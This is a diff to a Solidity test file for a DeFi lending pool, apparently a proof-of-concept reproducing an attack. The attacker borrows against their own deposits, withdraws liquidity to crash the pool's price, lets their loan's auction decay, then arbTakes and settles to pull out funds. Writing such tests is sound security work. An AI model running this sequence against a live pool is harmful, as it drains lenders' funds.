@@ -208,16 +208,23 @@ contract ERC20PoolBorrowTest is ERC20HelperContract {
         );
 
         // Attacker does the following in quick succession (ideally same block):
-        console.log(_indexOf(100.0 * 1e18), "price");
 
-        // 2a. deposits 200 quote token at price 100
-
+        // deposits 100 quote token at price 100
         _addLiquidity({
             from:    _attacker,
-            amount:  200.0 * 1e18,
+            amount:  100.0 * 1e18,
             index:   3232,
-            lpAward: 200 * 1e18,
+            lpAward: 100 * 1e18,
             newLup:  100.332368143282009890 * 1e18
+        });
+
+        // deposits 100 quote token at price 100.5
+        _addLiquidity({
+            from:    _attacker,
+            amount:  100.0 * 1e18,
+            index:   3231,
+            lpAward: 100 * 1e18,
+            newLup:  100.834029983998419124 * 1e18
         });
 
         // 2b. posts 1.04 collateral and borrows 100 quote token
@@ -229,7 +236,7 @@ contract ERC20PoolBorrowTest is ERC20HelperContract {
 
         _borrow({
             from:       _attacker,
-            amount:     100.0 * 1e18,
+            amount:     99.9 * 1e18,
             indexLimit: 7388,
             newLup:     100332368143282009890
         });
@@ -239,36 +246,96 @@ contract ERC20PoolBorrowTest is ERC20HelperContract {
             from:       _attacker,
             index:      3232,
             borrower:   _attacker,
-            debt:       100.096153846153846200 * 1e18,
+            debt:       99.996057692307692354 * 1e18,
             collateral: 1.040000000000000000 * 1e18,
-            bond:       1.119109021431385084 * 1e18
+            bond:       1.117989912409953699 * 1e18
         });
 
         // 2d. withdraws 100 of the deposit from 2a
         _removeLiquidity({
-            from:     _lender,
-            amount:   10.0 * 1e18,
+            from:     _attacker,
+            amount:   100.0 * 1e18,
             index:    3232,
-            newLup:   1004968987.606512354182109771 * 1e18,
+            newLup:   1.000000000000000000 * 1e18,
             lpRedeem: 100.0 * 1e18
         });
 
         // Now wait until auction price drops to about $50
 
+        skip(8 hours);
+
+        _assertAuction(
+            AuctionParams({
+                borrower:          _attacker,
+                active:            true,
+                kicker:            _attacker,
+                bondSize:          1.117989912409953699 * 1e18,
+                bondFactor:        0.011180339887498948 * 1e18,
+                kickTime:          block.timestamp - 8 hours,
+                referencePrice:    106.899958477314643983 * 1e18,
+                totalBondEscrowed: 1.117989912409953699 * 1e18,
+                auctionPrice:      53.449979238657321992 * 1e18,
+                debtInAuction:     99.996057692307692354 * 1e18,
+                thresholdPrice:    96.154445987103992600 * 1e18,
+                neutralPrice:      106.899958477314643983 * 1e18
+            })
+        );
+
         // In a single block finish the attack:
-        // 2a. Call arbtake using 100 price bucket
+
+        // 2a. Call arbtake using 100 price bucket --> FIXME: 100.5 price bucket?
+        _arbTake({
+            from:             _attacker,
+            borrower:         _attacker,
+            kicker:           _attacker,
+            index:            3231,
+            collateralArbed:  1.040000000000000000 * 1e18,
+            quoteTokenAmount: 55.587978408203614872 * 1e18,
+            bondChange:       0.621492492262669154 * 1e18,
+            isReward:         true,
+            lpAwardTaker:     49.277977858647333263 * 1e18,
+            lpAwardKicker:    0.621474395662361706 * 1e18
+        });
+
         // 2b. Call settle
+        _settle({
+            from:        _attacker,
+            borrower:    _attacker,
+            maxDepth:    10,
+            settledDebt: 45032081604265944855
+        });
+
+        _assertBucket({
+            index:        3232,
+            lpBalance:    0 * 1e18,
+            collateral:   0,
+            deposit:      0 * 1e18,
+            exchangeRate: 1 * 1e18
+        });
+
+        _assertBucket({
+            index:        3231,
+            lpBalance:    149.899452254309694969 * 1e18,
+            collateral:   1.040000000000000000 * 1e18,
+            deposit:      0.147450248651705349 * 1e18,
+            exchangeRate: 0.700568546800615975 * 1e18
+        });
+
         // 2c. Withdraw the deposit remaing (should be about 50) and the collateral moved (should be 1.04) from the 100 price bucket (all go to the attacker)
+        _removeAllLiquidity({
+            from:     _attacker,
+            amount:   0.147450248651705349 * 1e18,
+            index:    3231,
+            newLup:   1.0 * 1e18,
+            lpRedeem: 0.210472264741383197 * 1e18
+        });
 
-
-
-
+        _removeAllCollateral({
+            from: _attacker,
+            amount: 1.040000000000000000 * 1e18,
+            index: 3231,
+            lpRedeem: 149.688979989568311772 * 1e18
+        });
     }
-
-
-
-
-
-
 
 }
